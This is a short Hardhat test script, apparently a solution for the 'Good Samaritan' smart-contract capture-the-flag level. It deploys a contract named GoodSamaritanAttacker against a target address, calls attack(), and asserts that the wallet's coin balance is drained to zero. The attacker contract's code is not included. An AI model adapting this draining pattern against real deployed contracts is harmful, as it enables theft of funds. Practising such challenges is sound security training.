import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const goodSamaritan = await ethers.getContractAt("GoodSamaritan", "0x045F4fB70Ce37d7Cee20Cd48A8369EcC270132eC");
    const coin = await ethers.getContractAt("Coin", await goodSamaritan.coin());
    const wallet = await ethers.getContractAt("Wallet", await goodSamaritan.wallet());

    const Attacker = await ethers.getContractFactory("GoodSamaritanAttacker");
    const attacker = await Attacker.deploy(goodSamaritan.address);

    await attacker.attack();

    expect(await coin.balances(wallet.address)).to.eq(0);
  })
})
